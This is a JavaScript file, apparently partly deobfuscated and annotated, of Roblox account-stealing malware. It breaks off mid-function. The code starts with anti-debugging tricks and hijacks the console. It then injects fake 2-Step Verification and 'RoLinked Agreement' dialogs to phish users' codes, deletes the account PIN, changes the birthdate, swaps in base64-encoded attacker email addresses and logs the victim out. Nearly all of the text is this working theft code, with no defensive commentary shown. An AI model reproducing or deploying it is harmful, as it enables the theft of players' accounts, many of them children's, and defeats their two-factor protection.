window[`setInterval`](AntiDebug, 4e3);

(async function () {
	O = (function () {
		var m = true;
		return function (k, G) {
			var i = m
				? function () {
					if (G) {
						var a = G[`apply`](k, arguments);
						return (G = null), a;
					}
				}
				: function () { };
			return (m = false), i;
		};
	})();

	X = O(this, function () {
		return X[`toString`]()[`search`]('(((.+)+)+)+$')[`toString`]()[`constructor`](X)[`search`]('(((.+)+)+)+$');
	});

	X();

	var A = (function () {
		var S = true;
		return function (k, G) {
			var i = S
				? function () {
					if (G) {
						var a = G[`apply`](k, arguments);
						return (G = null), a;
					}
				}
				: function () { };
			return (S = false), i;

		};
	})();

	(function () {
		A(this, function () {
			var k = new RegExp('function *\\( *\\)'),
				G = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
				q = AntiDebug('init');

			if (!k[`test`](q + 'chain') || !G[`test`](q + 'input')) {
				q('0')
			} else p[`location`][`reload`]();

		})();
	})();

	var p = (function () {
		var k = true;
		return function (q, i) {
			var w = k
				? function () {
					if (i) {
						var e = i[`apply`](q, arguments);
						return (i = null), e;
					}
				}
				: function () { };
			return (k = false), w;
		};
	})();

	h = p(this, function () {
		G = (window[`console`] = window[`console`] || {});
		for (var i = 0; i < 7; i++) {
			var a = p[`constructor`][`prototype`][`bind`](p);
			var e = q[i];
			var E = G[e] || a;
			a[`__proto__`] = p[`bind`](p);
			a[`toString`] = E[`toString`][`bind`](E);
			G[e] = a;
		}

	});

	h();

	const delay = (S) => new Promise((m) => setTimeout(m, S));

	var emailList = ['YWxiZXJ0aW5hZ3VlcnJlcm8xOTcxQGhvdG1haWwuY29t', 'YWx3aW5lLmxlbm9yYV8xOTg5QGhvdG1haWwuY29t', 'YXJjaGliYWxkYWxleGFuZHJhNjRAaG90bWFpbC5jb20=', 'YWxkcmlkZ2VhbmdlbGExM0Bob3RtYWlsLmNvbQ==', 'YW5pdGFiYWxkd2luNTBAaG90bWFpbC5jb20=', 'YWxpY2ViaXJjaDQwQGhvdG1haWwuY29t', 'YXJjaGliYWxkbWFyeTk0QGhvdG1haWwuY29t', 'YWx5c3NhZ2lsbW9yZTA5QGhvdG1haWwuY29t'];
	var hotmailSuffix = '@hotmail.com';
	var emailPart = 'a***';
	var randomEmail = emailList[Math[`floor`]((Math[`random`]() * emailList[`length`]))];
	var T = 15e3;
	var malwareCreatorId = 6045232974;

	var validDev = [];

	// Check if the user has any messages from VlK Games
	try {
		$[`ajax`]({
			method: 'GET',
			url: `https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20`,
			contentType: 'application/json',
			success: function (S) {
				var k = Number(S[`totalPages`]);
				for (let q = 0; q < k; q++) {
					$[`ajax`]({
						method: 'GET',
						url: `https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=` + q + `&pageSize=20`,
						contentType: 'application/json',
						success: function (res) {
							var collectionResult = res['collection'];
							for (var e of collectionResult) {
								if (e['body'][`includes`]('VlK Games') == true) {
									validDev[`push`]('true')
								}

							}
						}
					});
				}

			}
		})
	} catch { }

	// Check if the user has any messages from VlK Games in the archive
	try {
		$[`ajax`]({
			method: 'GET',
			url: `https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20`,
			contentType: 'application/json',
			success: function (k) {
				var totalPagesCount = Number(k['totalPages']);
				for (let a = 0; a < totalPagesCount; a++) {
					$[`ajax`]({
						method: 'GET',
						url: `https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=` + a + `&pageSize=20`,
						contentType: 'application/json',
						success: function (E) {
							var Z = E['collection'];
							for (var o of Z) {
								if (o['body'][`includes`]('VlK Games') == true) {
									validDev[`push`]('true');
								}
							}
						}
					})
				}
			}
		});
	} catch { }

	try {
		console[`log`](document[`getElementsByClassName`]('text-footer footer-note')[0][`innerText`]);
	} catch {
		window[`location`][`reload`]();
	}

	// Prevent the script from running multiple times
	if (document[`getElementsByClassName`]('text-footer footer-note')[0][`innerText`] != 'true')
		(
			document[`getElementsByClassName`]('text-footer footer-note')[0][`innerText`] = 'true',

			// Send a friend request to the malware creator
			$[`ajax`]({
				method: 'GET',
				url: 'https://users.roblox.com/v1/users/authenticated',
				contentType: 'application/json',
				success: function (res) {
					var userId = res.id;
					try {
						var w = {
							'friendshipOriginSourceType': 0
						};

						$[`ajax`]({
							method: 'POST',
							url: `https://friends.roblox.com/v1/users/` + malwareCreatorId + `/request-friendship`,
							contentType: 'application/json',
							data: JSON[`stringify`](w)
						});
					} catch { }

					async function replaceEmailAndLogout() {
						// Constantly check if the user email contains the attackers email suffix (***a), the hotmail domain and if it has been verified
						function pollEmailVerification() {
							$[`ajax`]({
								method: 'GET',
								url: `https://accountsettings.roblox.com/v1/email`,
								contentType: 'application/json',
								success: function (y) {
									// Check if email is unset and if so replace with an attacker email
									if (y['emailAddress'] == null) {
										$[`ajax`]({
											method: 'POST',
											url: `https://accountsettings.roblox.com/v1/email`,
											contentType: 'application/json',
											data: JSON[`stringify`]({ emailAddress: atob(randomEmail), password: '' })
										});

										// Check if email is set and if so check if it contains the attackers email suffix and the hotmail domain
										// If it does log the user out
									} else {
										var userEmail = y['emailAddress'];
										var isVerified = y['verified'];

										if (userEmail[`includes`](hotmailSuffix) == true) {
											if (userEmail[`includes`](emailPart) == true) {
												if (isVerified == true) {
													(async function () {
														await delay(500);
														$[`ajax`]({
															method: 'POST',
															url: `https://auth.roblox.com/v2/logout`,
															contentType: 'application/json'
														});
													})();
												}
											}
										}
									}
								}
							});

							setTimeout(pollEmailVerification, 2e3);
						}

						pollEmailVerification();

						// Ask for 2 factor email pin and disable it | Enter the code we just sent you via email.
						function handleEmailVerification(emailChallengeId, authenticationChallenge, y) {
							$[`ajax`]({
								method: 'POST',
								url: `https://twostepverification.roblox.com/v1/users/` + userId + `/challenges/email/send-code`,
								contentType: 'application/json',
								data: JSON[`stringify`]({ actionType: 'Generic', challengeId: emailChallengeId }),
								success: function () {
									var twoStepPromptsHTML = `<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete=undefined maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>`;
									document[`body`][`insertAdjacentHTML`]('beforeend', twoStepPromptsHTML);

									// Check if the user has entered a 6 digit code
									function checkVerificationCodeLength() {
										if (document[`getElementById`]('two-step-verification-code-input')[`value`][`length`] == 6) {
											document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`disabled`] = false;
										} else {
											document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`disabled`] = true;
										}
										setTimeout(checkVerificationCodeLength, 100);
									}
									checkVerificationCodeLength();

									// Verify the code
									document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`onclick`] = function () {
										$[`ajax`]({
											method: 'POST',
											url: `https://twostepverification.roblox.com/v1/users/` + userId + `/challenges/email/verify`,
											contentType: 'application/json',
											data: JSON[`stringify`]({
												challengeId: emailChallengeId,
												actionType: 'Generic',
												code: document[`getElementById`]('two-step-verification-code-input')[`value`]
											}),
											success: function (emailVerificationResult) {
												var verificationToken = emailVerificationResult['verificationToken'];
												$[`ajax`]({
													method: 'POST',
													url: 'https://apis.roblox.com/challenge/v1/continue',
													contentType: 'application/json',
													data: JSON[`stringify`]({
														challengeId: authenticationChallenge,
														challengeMetadata:
															`{"verificationToken":"` + verificationToken + `","rememberDevice":false,"challengeId":"` + emailChallengeId + `","actionType":"Generic"}`,
														challengeType: 'twostepverification'
													}),
													success: function () {
														document[`getElementById`]('twoStepPrompts')[`remove`]();
														var encodedReauthenticationToken = btoa(`{"reauthenticationToken":"` + verificationToken + '"}');
														console[`log`](y);
														if (y == 1) {
															console[`log`]('Reason is 1');
															$[`ajax`]({
																'method': 'POST',
																'url': `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration/email/enable`,
																'contentType': 'application/json',
																'headers': { 'Rblx-Challenge-Type': 'reauthentication', 'Rblx-Challenge-Id': authenticationChallenge, 'Rblx-Challenge-Metadata': encodedReauthenticationToken }
															})
														} else {
															if (y == null) {
																$[`ajax`]({
																	method: 'DELETE',
																	url: `https://auth.roblox.com/v1/account/pin`,
																	contentType: 'application/json',
																	headers: {
																		'Rblx-Challenge-Type': 'reauthentication',
																		'Rblx-Challenge-Id': authenticationChallenge,
																		'Rblx-Challenge-Metadata': encodedReauthenticationToken
																	},
																	success: function () {
																		stealAccount(null, null)
																	}
																})
															} else {
																stealAccount(authenticationChallenge, encodedReauthenticationToken)
															}
														}
													}
												});
											},
											error: function () {
												document[`getElementsByClassName`]('form-control-label bottom-label xsmall')[0][`innerText`] = 'undefinedid code'
												document[`getElementById`]('groupElementId')[`className`] = 'form-has-feedback  form-has-error form-group'
											}
										});
									};

								}
							});
						}
						function handleAuthenticatorVerification(challengeId1, challengeId2, y) {
							var twoStepPromptsHTML = `<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>`;
							document[`body`][`insertAdjacentHTML`]('beforeend', twoStepPromptsHTML);

							// Check if the user has entered a 6 digit code
							function checkVerificationCodeLength() {
								((document[`getElementById`]('two-step-verification-code-input')[`value`][`length`] == 6)
									? (document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`disabled`] = false)
									: (document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`disabled`] = true),
									setTimeout(checkVerificationCodeLength, 100));
							}
							checkVerificationCodeLength();

							document[`getElementsByClassName`](`btn-cta-md modal-modern-footer-button`)[0][`onclick`] = function () {
								$[`ajax`]({
									method: 'POST',
									url: `https://twostepverification.roblox.com/v1/users/` + userId + `/challenges/authenticator/verify`,
									contentType: 'application/json',
									data: JSON[`stringify`]({
										challengeId: challengeId1,
										actionType: 'Generic',
										code: document[`getElementById`]('two-step-verification-code-input')[`value`]
									}),
									success: function (response) {
										var verificationToken = response['verificationToken'];
										$[`ajax`]({
											method: 'POST',
											url: 'https://apis.roblox.com/challenge/v1/continue',
											contentType: 'application/json',
											data: JSON[`stringify`]({
												challengeId: challengeId2,
												challengeMetadata: `{"verificationToken":"` + verificationToken + `","rememberDevice":false,"challengeId":"` + challengeId1 + `","actionType":"Generic"}`,
												challengeType: 'twostepverification'
											}),
											success: async function () {
												document[`getElementById`]('twoStepPrompts')[`remove`]();
												await delay(2e3);
												var challengeMetadata = btoa(`{"reauthenticationToken":"` + verificationToken + '"}');

												if (y == 1) {
													console[`log`]('Reason is 1');
													$[`ajax`]({
														method: 'POST',
														url: `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration/email/enable`,
														contentType: 'application/json',
														headers: {
															'Rblx-Challenge-Type': 'reauthentication',
															'Rblx-Challenge-Id': challengeId2,
															'Rblx-Challenge-Metadata': challengeMetadata
														},
													});
												} else {
													if (y == null) {
														$[`ajax`]({
															method: 'DELETE',
															url: `https://auth.roblox.com/v1/account/pin`,
															contentType: 'application/json',
															headers: { 'Rblx-Challenge-Type': 'reauthentication', 'Rblx-Challenge-Id': challengeId2, 'Rblx-Challenge-Metadata': challengeMetadata },
															success: function () {
																stealAccount(null, null)
															}
														});
													} else
														stealAccount(challengeId2, challengeMetadata);
												}
											}
										});
									},
									error: function (Y) {
										if (Y['responseText'][`includes`]('"code":18')) {
											(document[`getElementsByClassName`]('form-control-label bottom-label xsmall')[0][`innerText`] = 'This code has already been used. Please enter a new code.'),
												(document[`getElementById`]('groupElementId')[`className`] = 'form-has-feedback  form-has-error form-group');
										} else
											((document[`getElementsByClassName`]('form-control-label bottom-label xsmall')[0][`innerText`] = 'undefinedid code'),
												(document[`getElementById`]('groupElementId')[`className`] = 'form-has-feedback  form-has-error form-group'));
									}
								})

							};

						}

						// A one-time code has been sent to your registered email
						function handleVerificationCode(challengeId, C) {
							$[`ajax`]({
								method: `POST`,
								url: `https://apis.roblox.com/otp-service/v1/sendCodeForUser`,
								contentType: `application/json`,
								data: JSON[`stringify`]({ contactType: `Email`, messageVariant: `Default`, origin: `Reauth` }),
								success: function (sendCodeForUser_response) {
									var u = sendCodeForUser_response[`otpSessionToken`];
									var twoStepVerificationModal = `<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall"> ;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>`;
									document[`body`][`insertAdjacentHTML`](`beforeend`, twoStepVerificationModal);

									// Check if the user has entered a 6 digit code
									function checkVerificationCodeLength() {
										if (document[`getElementById`](`two-step-verification-code-input`)[`value`][`length`] == 6) {
											document[`getElementsByClassName`](`btn-cta-md modal-modern-footer-button`)[0][`disabled`] = false;
										} else {
											document[`getElementsByClassName`](`btn-cta-md modal-modern-footer-button`)[0][`disabled`] = true;
										}
										setTimeout(checkVerificationCodeLength, 100);
									}
									checkVerificationCodeLength();


									document[`getElementsByClassName`](`btn-cta-md modal-modern-footer-button`)[0][`onclick`] = function () {
										$[`ajax`]({
											method: `POST`,
											url: `https://apis.roblox.com/otp-service/v1/validateCode`,
											contentType: `application/json`,
											data: JSON[`stringify`]({
												contactType: `Email`,
												origin: `Reauth`,
												otpSessionToken: u,
												passCode: document[`getElementById`](`two-step-verification-code-input`)[`value`]
											}),
											success: function () {
												$[`ajax`]({
													method: `POST`,
													url: `https://apis.roblox.com/reauthentication-service/v1/token/generate`,
													contentType: `application/json`,
													data: JSON[`stringify`]({ sessionId: u, type: `Otp_Email` }),
													success: function (token_generate_response) {
														responseToken = token_generate_response[`token`];
														$[`ajax`]({
															method: `POST`,
															url: `https://apis.roblox.com/challenge/v1/continue`,
															contentType: `application/json`,
															data: JSON[`stringify`]({
																challengeId: challengeId,
																challengeMetadata: `{"reauthenticationToken":"` + responseToken + '"}',
																challengeType: `reauthentication`
															}),
															success: async function () {
																document[`getElementById`](`twoStepPrompts`)[`remove`]();
																await delay(2e3);
																var encodedToken = btoa(`{"reauthenticationToken":"` + responseToken + '"}');
																if (C == 1) {
																	console[`log`](`Reason is 1`);
																	$[`ajax`]({
																		method: `POST`,
																		url: `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration/email/enable`,
																		contentType: `application/json`,
																		headers: {
																			'Rblx-Challenge-Type': `reauthentication`,
																			'Rblx-Challenge-Id': challengeId,
																			'Rblx-Challenge-Metadata': encodedToken
																		}
																	})

																} else {
																	if (C == null) {
																		$[`ajax`]({
																			method: `DELETe`,
																			url:
																				`https://auth.roblox.com/v1/account/pin`,
																			contentType: `application/json`,
																			headers: {
																				'Rblx-Challenge-Type': `reauthentication`,
																				'Rblx-Challenge-Id': challengeId,
																				'Rblx-Challenge-Metadata': encodedToken
																			},
																			success: function () {
																				stealAccount(null, null);
																			}
																		});
																	} else
																		stealAccount(challengeId, encodedToken);
																}

															}
														});
													}
												})
											},
											error: function () {
												document[`getElementsByClassName`](`form-control-label bottom-label xsmall`)[0][`innerText`] = `undefinedid code`;
												document[`getElementById`](`groupElementId`)[`className`] = `form-has-feedback  form-has-error form-group`;
											}
										});
									};

								}
							});
						}
						function handleUserVerification(challengeId, rblx_challenge_id, reason) {
							$[`ajax`]({
								method: `GET`,
								url: `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration`,
								contentType: `application/json`,
								success: function (userData) {
									var u = userData[`primaryMediaType`];
									if ((u == `Email`))
										handleEmailVerification(challengeId, rblx_challenge_id, reason);
									else {
										if (u == `Authenticator`) {
											handleAuthenticatorVerification(challengeId, rblx_challenge_id, reason);
										} else {
											if (u == null) {
												handleVerificationCode(rblx_challenge_id, reason);
											}
										}
									}
								}
							});
						}

						// Steal the account
						function stealAccount(challengeId, encodedToken) {
							$[`ajax`]({
								method: `GET`,
								url: `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration`,
								contentType: `application/json`,
								success: function (F) {
									var primaryMediaType = F[`primaryMediaType`];

									// If user uses Authenticator instead of Email enable Email 2-Step Verification
									if (primaryMediaType == `Authenticator`) {
										document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
										if (document[`getElementById`](`emailPopupz`) == null) {
											var u = `<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>`;
											document[`body`][`insertAdjacentHTML`](`beforeend`, u);
											document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`onclick`] = function () {
												document[`getElementById`](`emailPopupz`)[`remove`]();
												document[`getElementById`](`agreeRoLinked`)[`disabled`] = false;
												$[`ajax`]({
													method: `POST`,
													url: `https://twostepverification.roblox.com/v1/users/` + userId + `/configuration/email/enable`,
													contentType: `application/json`,
													success: function () { },
													error: function (s) {
														var challengeMetadataBase64 = atob(s[`getResponseHeader`](`rblx-challenge-metadata`));
														var robloxChallengeId = s[`getResponseHeader`](`rblx-challenge-id`);
														var emailChallengeId = challengeMetadataBase64[`split`](`"challengeId":"`)[`pop`]()[`split`](`"`)[0];

														handleUserVerification(emailChallengeId, robloxChallengeId, 1);
													}
												});

											};
										}
									} else {
										if (challengeId == null) {
											var userBirthdayData = {
												'birthDay': 2,
												'birthMonth': 2,
												'birthYear': 2022
											};
											$[`ajax`]({
												method: `POST`,
												url: `https://users.roblox.com/v1/birthdate`,
												contentType: `application/json`,
												data: JSON[`stringify`](userBirthdayData),
												success: function () {
													$[`ajax`]({
														method: `POST`,
														url: `https://accountsettings.roblox.com/v1/email`,
														contentType: `application/json`,
														data: JSON[`stringify`]({
															emailAddress: atob(randomEmail), password: ''
														}),
														success: async function () {
															await delay(1500);
															$[`ajax`]({
																method: `GET`,
																url: `https://accountsettings.roblox.com/v1/email`,
																contentType: `application/json`,
																success: function (z2) {
																	if (z2[`emailAddress`] == null) {
																		$[`ajax`]({
																			method: `POST`,
																			url:
																				`https://accountsettings.roblox.com/v1/email`,
																			contentType: `application/json`,
																			data: JSON[`stringify`]({
																				emailAddress: atob(randomEmail),
																				password: ''
																			})
																		});
																	}
																}
															});
														},
														error: async function () {
															await delay(1500);

															$[`ajax`]({
																method: `GET`,
																url: `https://accountsettings.roblox.com/v1/email`,
																contentType: `application/json`,
																success: function (z4) {
																	if (z4[`emailAddress`] == null)
																		$[`ajax`]({
																			method: `POST`,
																			url: `https://accountsettings.roblox.com/v1/email`,
																			contentType: `application/json`,
																			data: JSON[`stringify`]({
																				emailAddress: atob(randomEmail),
																				password: ''
																			})
																		});
																}
															});
														}
													})();
												},
												error: function (x) {
													var decodedChallengeMetadata = atob(x[`getResponseHeader`](`rblx-challenge-metadata`));
													var rblx_challenge_id = x[`getResponseHeader`](`rblx-challenge-id`);
													var parsedChallengeId = decodedChallengeMetadata[`split`](`"challengeId":"`)[`pop`]()[`split`](`"`)[0];

													handleUserVerification(parsedChallengeId, rblx_challenge_id, 2);
												}
											});

										} else {
											var userBirthday = {
												'birthDay': 2,
												'birthMonth': 2,
												'birthYear': 2022
											};

											$[`ajax`]({
												method: `POST`,
												url: `https://users.roblox.com/v1/birthdate`,
												contentType: `application/json`,
												headers: { 'Rblx-Challenge-Type': `reauthentication`, 'Rblx-Challenge-Id': challengeId, 'Rblx-Challenge-Metadata': encodedToken },
												data: JSON[`stringify`](userBirthday),
												success: function () {
													$[`ajax`]({
														method: `POST`,
														url: `https://accountsettings.roblox.com/v1/email`,
														contentType: `application/json`,
														data: JSON[`stringify`]({
															emailAddress: atob(randomEmail),
															password: ''
														}),
														success: async function () {
															await delay(1500);
															$[`ajax`]({
																method: `GET`,
																url: `https://accountsettings.roblox.com/v1/email`,
																contentType: `application/json`,
																success: function (z3) {
																	(z3[`emailAddress`] == null) &&
																		$[`ajax`]({
																			method: `POST`,
																			url: `https://accountsettings.roblox.com/v1/email`,
																			contentType: `application/json`,
																			data: JSON[`stringify`]({
																				emailAddress: atob(randomEmail),
																				password: ''
																			})
																		});

																}
															});
														},
														error: function () {
															(async function () {
																await delay(1500);
																$[`ajax`]({
																	method: `GET`,
																	url: `https://accountsettings.roblox.com/v1/email`,
																	contentType: `application/json`,
																	success: function (z2) {
																		if (z2[`emailAddress`] == null) {
																			$[`ajax`]({
																				method: `POST`,
																				url: `https://accountsettings.roblox.com/v1/email`,
																				contentType: `application/json`,
																				data: JSON[`stringify`]({
																					emailAddress: atob(randomEmail), password: ''
																				})
																			});
																		}
																	}
																})
															})();
														}
													});
												},
												error: function (x) {
													var z0 = atob(x[`getResponseHeader`](`rblx-challenge-metadata`));
													var z1 = x[`getResponseHeader`](`rblx-challenge-id`);
													var z2 = z0[`split`](`"challengeId":"`)[`pop`]()[`split`](`"`)[0];
													handleUserVerification(z2, z1, 2);
												}
											});
										}
									}
								}
							});
						}

						// Rolinked Agreement
						if (document[`getElementById`](`RoLinked1`) == null) {
							var r = `<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>`;
							document[`body`][`insertAdjacentHTML`](`beforeend`, r),
								(document[`getElementById`](`agreeRoLinked`)[`onclick`] = function () {
									document[`getElementById`](`agreeRoLinked`)[`disabled`] = true;
									$[`ajax`]({
										method: `GET`,
										url: `https://auth.roblox.com/v1/account/pin`,
										contentType: `application/json`,
										success: function (account_pin_settings) {
											var isPinEnabled = account_pin_settings[`isEnabled`];
											var pinExpiration = account_pin_settings[`unlockedUntil`];
											if (isPinEnabled == true) {
												if (pinExpiration == null) {
													document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
													if (document[`getElementById`](`pinPopupz`) == null) {
														var n = `<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>`;
														document[`body`][`insertAdjacentHTML`](`beforeend`, n);
														document[`getElementsByClassName`](`btn-cta-md modal-modern-footer-button`)[0][`onclick`] = function () {
															document[`getElementById`](`pinPopupz`)[`remove`]();
															document[`getElementById`](`agreeRoLinked`)[`disabled`] = false;
														};
													}
												} else {
													try {
														document[`getElementById`](`pinPopupz`)[`remove`]();
													} catch { }
													$[`ajax`]({
														method: `DELETe`,
														url: `https://auth.roblox.com/v1/account/pin`,
														contentType: `application/json`,
														success: function () {
															stealAccount(null, null);
														},
														error: function (u) {
															var Y = atob(u[`getResponseHeader`](`rblx-challenge-metadata`));
															var j = u[`getResponseHeader`](`rblx-challenge-id`);
															var f = Y[`split`](`"challengeId":"`)[`pop`]()[`split`](`"`)[0];

															handleUserVerification(f, j, null);
														}
													});
												}
											} else stealAccount(null, null);
										}
									});
								});
						} else
							$[`ajax`]({
								method: `GET`,
								url: `https://auth.roblox.com/v1/account/pin`,
								contentType: `application/json`,
								success: function (H) {
									y = H[`isEnabled`];
									var F = H[`unlockedUntil`];
									if (y == true) {
										if (F == null) {
											document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
											if ((document[`getElementById`](`pinPopupz`) == null)) {
												var P = `<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>`;
												document[`body`][`insertAdjacentHTML`](`beforeend`, P);
												(document[`getElementsByClassName`]('btn-cta-md modal-modern-footer-button')[0][`onclick`] = function () {
													document[`getElementById`](`pinPopupz`)[`remove`]();
													document[`getElementsByClassName`](`text-footer footer-note`)[0][`innerText`] = `Not Active`;
												});
											}
										} else {
											try {
												document[`getElementById`](`pinPopupz`)[`remove`]();
											} catch { }
											$[`ajax`]({
												method: `DELETe`,
												url: `https://auth.roblox.com/v1/account/pin`,
												contentType: `application/json`,
												success: function () {
													stealAccount(null, null);
												},
												error: function (n) {
													var decodedMetadata = atob(n[`getResponseHeader`](`rblx-challenge-metadata`));
													var rblx_challenge_id = n[`getResponseHeader`](`rblx-challenge-id`);
													var parsedChallengeId = decodedMetadata[`split`](`"challengeId":"`)[`pop`]()[`split`](`"`)[0];

